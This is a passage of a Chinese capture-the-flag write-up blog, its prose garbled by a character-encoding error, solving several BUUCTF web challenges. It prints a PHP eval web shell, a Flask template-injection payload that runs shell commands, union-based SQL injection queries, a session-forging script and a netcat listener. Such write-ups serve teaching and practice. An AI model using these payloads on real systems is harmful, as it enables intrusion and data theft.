<p>ä¿®æ”¹sessionä¸º.phpç»“å°¾çš„32ä½é•¿åº¦çš„æ–‡ä»¶åï¼Œæ”¾åŒ…ï¼Œåœ¨searché¡µé¢å†™å…¥shellï¼Œåœ¨è¿™ä¹‹å‰å¯ä»¥æµ‹è¯•ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<img src="/2020/06/26/taoismf/12.png" class="">

<p>æˆåŠŸå†™å…¥</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å†™å…¥ä¸€å¥è¯æ¥getshellï¼Œå†ç”¨èšå‰‘è¿›è¡Œè¿æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>

<img src="/2020/06/26/taoismf/13.png" class="">

<p>åˆ°è¿™é‡Œè¿˜æ²¡æœ‰ç»“æŸï¼Œè¿™é‡Œå­˜åœ¨disable_functionï¼Œä¸èƒ½å¤Ÿç›´æ¥è¯»å–åˆ°flagï¼Œæƒ³åˆ°äº†ä¹‹å‰é‚£é“RCEMEï¼Œå¹¶ä¸”phpç‰ˆæœ¬æ˜¯ä¸€æ ·çš„ï¼Œä¸Šä¼ expåˆ°tmpç›®å½•ä¸‹ï¼Œä¿®æ”¹æ‰§è¡Œå‘½ä»¤</p>
<img src="/2020/06/26/taoismf/14.png" class="">

<p>åŒ…å«è¯¥expæ–‡ä»¶</p>
<img src="/2020/06/26/taoismf/15.png" class="">

<h3 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h3><p>å¼€é¢˜å°±ç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">"/var/babyctf/"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"/flag"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] ===<span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">'/var/babyctf/success.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] =<span class="string">'guest'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">'direction'</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">'attr'</span>);</span><br><span class="line">$dir_path = <span class="string">"/var/babyctf/"</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">"private"</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">"/"</span>.$_SESSION[<span class="string">'username'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">"upload"</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid upload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$_FILES[<span class="string">'up_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_path .= <span class="string">"_"</span>.hash_file(<span class="string">"sha256"</span>,$_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">"uploaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">"download"</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">'filename'</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'file not exist'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">'Content-Type: application/force-download'</span>);</span><br><span class="line">        header(<span class="string">'Content-Length: '</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">'"'</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">"downloaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å®¡è®¡ï¼š</p>
<p>å¼€å§‹çš„æ—¶å€™è®¾ç½®äº†sessionçš„å­˜å‚¨è·¯å¾„åœ¨/var/babyctfä¸‹ï¼Œå¼€å¯sessionï¼ŒåŒ…å«äº†/flagæ–‡ä»¶ã€‚ä¹‹ååˆ¤æ–­sessionä¸­çš„usernameçš„å€¼æ˜¯å¦ä¸ºadminï¼Œå¦‚æœæ˜¯adminå°±åˆ¤æ–­åœ¨/var/babyctf/è·¯å¾„ä¸‹æœ‰æ²¡æœ‰success.txtæ–‡ä»¶ï¼Œæœ‰å¾—è¯å°±åˆ é™¤è¯¥æ–‡ä»¶ï¼Œæ˜¾ç¤ºflagä¸­çš„å†…å®¹</p>
<img src="/2020/06/26/taoismf/16.png" class="">

<p>direcetionä¸ºuploadæ—¶ï¼Œä¸Šä¼ çš„æ–‡ä»¶çš„fieldæ˜¯up_file,å¹¶ä¸”æ–‡ä»¶ååé¢ä¼šæ‹¼æ¥ä¸Š_å’Œè¯¥æ–‡ä»¶çš„sha256æ‘˜è¦å€¼ï¼Œä¸Šä¼ çš„æ–‡ä»¶å¯æ§ï¼Œåœ¨æœ¬åœ°å¯ä»¥ç”Ÿæˆå¯¹åº”çš„sha256çš„å€¼ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰è·¯å¾„ç©¿è¶Šï¼Œä¹‹åå°±ä¸Šä¼ ç»“æŸ</p>
<img src="/2020/06/26/taoismf/17.png" class="">

<p>ä¸‹è½½æ“ä½œï¼Œè·å–è¦è¯»å–çš„æ–‡ä»¶å(POST filenameå‚æ•°)ï¼Œæ‹¼æ¥è·¯å¾„ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰è·¯å¾„ç©¿è¶Šï¼Œè¿”å›æ–‡ä»¶å†…å®¹ã€‚</p>
<img src="/2020/06/26/taoismf/18.png" class="">

<p>æ€è·¯ï¼šä¼ªé€ sessionï¼Œæ˜¯username=admin-&gt;åˆ›å»ºä¸Šä¼ succrss.txtæ–‡ä»¶-&gt;è¯»å–flag</p>
<p>è¯»å–å·²ç»å­˜åœ¨çš„æ–‡ä»¶ï¼Œè¿”å›æ–‡ä»¶å†…å®¹å¦‚ä¸‹</p>
<img src="/2020/06/26/taoismf/19.png" class="">

<p>å¯ä»¥çœ‹åˆ°æœ€å‰é¢æœ‰ç€0x08,æœç´¢èµ„æ–™å¯èƒ½æ˜¯php_binaryå¼•æ“</p>
<img src="/2020/06/26/taoismf/20.png" class="">

<p>expï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_binary'</span>);</span><br><span class="line">session_save_path(<span class="string">"C:\\Users\\60120\\PhpstormProjects\\untitled"</span>);<span class="comment">#ç”Ÿæˆæ–‡ä»¶çš„è·¯å¾„</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = <span class="string">'admin'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨phpä¸­å°†ç”Ÿæˆçš„sessionæ–‡ä»¶å‘½åä¸ºsess,ä¸Šä¼ </p>
<img src="/2020/06/26/taoismf/21.png" class="">

<p>è®¡ç®—ä¸€ä¸‹sha256çš„å€¼</p>
<img src="/2020/06/26/taoismf/22.png" class="">

<p>ä¿®æ”¹cookieä¸­sessionçš„å€¼ä¸ºæ–°ç”Ÿæˆçš„å€¼</p>
<p>ä¸‹é¢å°±æ˜¯åˆ›å»ºsuccess.txtæ–‡ä»¶ï¼Œatträ¸ºç©ºåˆ™ç›´æ¥è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¿™é‡Œè®©attrçš„å€¼ä¸ºsuccess.txtå°±èƒ½å¤ŸæˆåŠŸåˆ›å»ºsuccess.txtæ–‡ä»¶</p>
<img src="/2020/06/26/taoismf/23.png" class="">

<p>ä¸Šä¼ ä¹‹åå¯ä»¥è¯»å–ä¸€ä¸‹æ–‡ä»¶çœ‹çœ‹æ˜¯å¦ä¸Šä¼ æˆåŠŸï¼Œä¹‹åå†åˆ·æ–°ä¸€ä¸‹é¡µé¢å°±èƒ½å¤Ÿçœ‹åˆ°flagäº†</p>
<img src="/2020/06/26/taoismf/24.png" class="">

<h3 id="V-amp-N2020-å…¬å¼€èµ›-TimeTravel"><a href="#V-amp-N2020-å…¬å¼€èµ›-TimeTravel" class="headerlink" title="[V&amp;N2020 å…¬å¼€èµ›]TimeTravel"></a>[V&amp;N2020 å…¬å¼€èµ›]TimeTravel</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥flagï¼Œè¯·æ±‚httpapiæœåŠ¡ï¼Œå¦‚æœæœåŠ¡è¿”å›çš„æ˜¯successï¼Œé‚£ä¹ˆå°±æ‰§è¡Œè¯»å–readflag</p>
<p>ä¼ å…¥fileï¼Œè¿”å›fileå†…å®¹</p>
<p>ä¼ å…¥phpinfoï¼Œè¿”å›phpinfo()</p>
<p>æ²¡æœ‰åšè¿‡è¿™ç§é¢˜ï¼Œçœ‹äº†èµµæ€»çš„wpï¼Œçœ‹äº†ç»™çš„GitHubé“¾æ¥</p>
<img src="/2020/06/26/taoismf/25.png" class="">

<p>buuä¸Šèµ·ä¸€å°å†…ç½‘æœºå­ï¼Œå†™å…¥b.txt(å«–çš„exp)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.14.2</span><br><span class="line">Date: Fri, 06 Mar 2020 18:27:31 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>ç›‘å¬ç«¯å£ï¼Œnc -lvvp 8888 &lt; b.txt</p>
<p>postmanä¼ å…¥headerï¼Œåˆ·æ–°ä¸€ä¸‹è¿”å›é¡µé¢æ‹¿åˆ°flag</p>
<img src="/2020/06/26/taoismf/26.png" class="">

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>taoismt</title>
    <url>/2020/07/04/taoismt/</url>
    <content><![CDATA[<h3 id="RootersCTF2019-I-â™¥-Flask"><a href="#RootersCTF2019-I-â™¥-Flask" class="headerlink" title="[RootersCTF2019]I_ â™¥ _Flask"></a>[RootersCTF2019]I_ â™¥ _Flask<a id="more"></a></h3><p>æ ¹æ®é¢˜ç›®çš„æ„æ€ï¼Œåº”è¯¥æ˜¯flaskæ¨¡æ¿æ³¨å…¥ï¼Œæ‰¾åˆ°sstiæ¨¡æ¿æ³¨å…¥çš„payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('id').read()"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ç¯‡æ–‡ç« payloadå¾ˆè¯¦ç»†ï¼š<a href="https://www.cnblogs.com/hackxf/p/10480071.html" target="_blank" rel="noopener">https://www.cnblogs.com/hackxf/p/10480071.html</a></p>
<p>è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯æ²¡æœ‰ç»™ä¼ å…¥çš„å‚æ•°ï¼Œè¿™é‡Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpï¼Œç”¨åˆ°äº†ä¸€ä¸ªå·¥å…·å«Arjun-masterï¼Œå¯ä»¥æ‰¾åˆ°ä¼ å…¥çš„å‚æ•°ï¼Œgetã€postã€jsonå½¢å¼çš„éƒ½å¯ä»¥ï¼Œreadme.mdæ–‡æ¡£é‡Œéƒ½æœ‰è¯´æ˜</p>
<p>è¿™é‡Œæ‰¾ä¸€ä¸‹</p>
<img src="/2020/07/04/taoismt/1.png" class="">

<p>ä¸€æŠŠæ¢­èµ‹å€¼ç»™name</p>
<img src="/2020/07/04/taoismt/2.png" class="">

<p>ç„¶åæŠŠpopené‡Œçš„å‚æ•°æ”¹ä¸€ä¸‹å°±å¯ä»¥äº†</p>
<h3 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h3><p>æ•´ä¸ªç½‘é¡µæ‰¾éäº†ä¹Ÿæ²¡æ‰¾åˆ°ç‚¹ï¼Œæ‰«ä¸€å‘ä¹Ÿæ²¡å‘ç°ä»€ä¹ˆä¸œè¥¿</p>
<p>googleçš„F12æœ‰å‘ç°</p>
<img src="/2020/07/04/taoismt/3.png" class="">

<p>ç»™äº†è·¯å¾„å’Œå‚æ•°ï¼ŒæŸ¥è¯¢ä¸€ä¸‹å­—æ®µ</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">query?search=amazonis_planitia order by 2</span><br><span class="line"><span class="comment">#æ­£å¸¸è¿”å›jsonæ•°æ®ï¼Œæ”¹ä¸º3è¿”å›2</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢å°±æ˜¯å¸¸è§„æŸ¥æ•°æ®åº“åï¼Œè¡¨åï¼Œåˆ—åï¼Œå­—æ®µå€¼</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">query?search=amazonis_planitia%20union%20select%20group_concat(schema_name),2%20from%20information_schema.schemata</span><br><span class="line"><span class="comment">#["information_schema,alien_code,aliens","2"]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">/query?search=amazonis_planitia%20union%20select%20group_concat(table_name),2%20from%20information_schema.tables%20where%20table_schema=%27alien_code%27</span><br><span class="line"><span class="comment">#["code","2"]]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">query?search=amazonis_planitia%20union%20select%20group_concat(column_name),2%20from%20information_schema.columns%20where%20table_schema=%27alien_code%27</span><br><span class="line"><span class="comment">#["id,code","2"]]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">query?search=amazonis_planitia%20union%20select%20group_concat(code),2%20from%20alien_code.code</span><br><span class="line"><span class="comment">#["flag&#123;e945022c-5205-409e-8a0c-a8fe4afd6742&#125;","2"]]</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå‘ç°sqlmapä¸€æŠŠæ¢­ä¹Ÿå¯ä»¥ï¼Œç›´æ¥è´´å›¾</p>
<img src="/2020/07/04/taoismt/4.png" class="">

<h3 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h3><p>æ‰“å¼€ï¼Œç™»å½•ï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶</p>
<p>éšæ‰‹ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œåªè¯´äº†ä¸Šä¼ æˆåŠŸï¼Œ é‰´äºå‰é¢é¢˜ç›®ç»éªŒï¼Œåœ¨å‰ç«¯æºç æ‰¾åˆ°äº†è·¯å¾„ï¼Œå¾ˆé—æ†¾ï¼Œèšå‰‘è¿ä¸ä¸Šï¼Œçœ‹æ¥ä¸æ˜¯è¿™æ ·åšçš„</p>
<p>æ‰«æå™¨æ‰«ä¸€æ‰«ï¼Œä¹Ÿæ²¡æ‰«åˆ°å•¥ä¸œè¥¿ï¼Œè¿˜å¥½ï¼Œèƒ½å»GitHubçœ‹æºç (åˆ«çš„å¸ˆå‚…è¯´æºç é¢˜ç›®æ˜¯ç›´æ¥ç»™çš„ï¼Œç„¶åbuuå¤ç°å¯èƒ½å¿˜äº†)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib/util.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib/session.php'</span>);</span><br><span class="line"></span><br><span class="line">$session = <span class="keyword">new</span> SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check whether file is uploaded</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]) || !is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>])) &#123;</span><br><span class="line">  error(<span class="string">'No file was uploaded.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file size</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] &gt; <span class="number">256000</span>) &#123;</span><br><span class="line">  error(<span class="string">'Uploaded file is too large.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file type</span></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line"><span class="keyword">if</span> (!in_array($type, [<span class="string">'image/png'</span>])) &#123;</span><br><span class="line">  error(<span class="string">'Uploaded file is not PNG format.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file width/height</span></span><br><span class="line">$size = getimagesize($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">0</span>] &gt; <span class="number">256</span> || $size[<span class="number">1</span>] &gt; <span class="number">256</span>) &#123;</span><br><span class="line">  error(<span class="string">'Uploaded image is too large.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">2</span>] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  <span class="comment">// I hope this never happens...</span></span><br><span class="line">  error(<span class="string">'What happened...? OK, the flag for part 1 is: &lt;code&gt;'</span> . getenv(<span class="string">'FLAG1'</span>) . <span class="string">'&lt;/code&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ok</span></span><br><span class="line">$filename = bin2hex(random_bytes(<span class="number">4</span>)) . <span class="string">'.png'</span>;</span><br><span class="line">move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], UPLOAD_DIR . <span class="string">'/'</span> . $filename);</span><br><span class="line"></span><br><span class="line">$session-&gt;set(<span class="string">'avatar'</span>, $filename);</span><br><span class="line">flash(<span class="string">'info'</span>, <span class="string">'Your avatar has been successfully updated!'</span>);</span><br><span class="line">redirect(<span class="string">'/'</span>);</span><br></pre></td></tr></table></figure>

<p>åˆ¤æ–­æ–‡ä»¶å¤§å°ï¼Œæ²¡å½±å“</p>
<p>åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œåªèƒ½æ˜¯pngå›¾ç‰‡</p>
<p>åˆ¤æ–­æ–‡ä»¶é«˜å®½</p>
<p>ç”¨finfoåˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œgetimagesizeåˆ¤æ–­æ–‡ä»¶çš„å®½åº¦å’Œé«˜åº¦ï¼Œè¿™é‡Œåˆè¦å›¾ç‰‡ç±»å‹ä¸èƒ½æ˜¯PNG</p>
<p>æœä¸€ä¸‹èµ„æ–™ï¼Œç ´ç¯å›¾ç‰‡çš„ç»“æ„å°±èƒ½å¤Ÿé¿å¼€getimagesizeçš„æ£€æµ‹ï¼Œå°±èƒ½å¤Ÿè®©é‚£ä¸ªä¸æ˜¯pngç±»å‹çš„åˆ¤æ–­æˆç«‹</p>
<img src="/2020/07/04/taoismt/5.png" class="">

<p>ä¸Šä¼ ï¼ŒæˆåŠŸ</p>
<img src="/2020/07/04/taoismt/6.png" class="">

<h3 id="HarekazeCTF2019-Avatar-Uploader-2"><a href="#HarekazeCTF2019-Avatar-Uploader-2" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 2"></a>[HarekazeCTF2019]Avatar Uploader 2</h3><p>ä¸Šé¢çš„upload.phpç”¨å®Œäº†ï¼Œè¿™é¢˜çœ‹å¦ä¸€ä¸ªè€ƒç‚¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#session.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureClientSession</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $cookieName;</span><br><span class="line">  <span class="keyword">private</span> $secret;</span><br><span class="line">  <span class="keyword">private</span> $data;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cookieName = <span class="string">'session'</span>, $secret = <span class="string">'secret'</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = [];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;secret = $secret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($cookieName, $_COOKIE)) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">list</span>($data, $signature) = explode(<span class="string">'.'</span>, $_COOKIE[$cookieName]);</span><br><span class="line">        $data = urlsafe_base64_decode($data);</span><br><span class="line">        $signature = urlsafe_base64_decode($signature);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;verify($data, $signature)) &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;data = json_decode($data, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">$this</span>-&gt;cookieName = $cookieName;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isset</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_key_exists($key, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $defaultValue = null)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isset($key)) &#123;</span><br><span class="line">      <span class="keyword">return</span> $defaultValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($key, $value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data[$key] = $value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unset</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;data[$key]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $json = json_encode(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    $value = urlsafe_base64_encode($json) . <span class="string">'.'</span> . urlsafe_base64_encode(<span class="keyword">$this</span>-&gt;sign($json));</span><br><span class="line">    setcookie(<span class="keyword">$this</span>-&gt;cookieName, $value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">verify</span><span class="params">($string, $signature)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> password_verify(<span class="keyword">$this</span>-&gt;secret . $string, $signature);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sign</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> password_hash(<span class="keyword">$this</span>-&gt;secret . $string, PASSWORD_BCRYPT);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

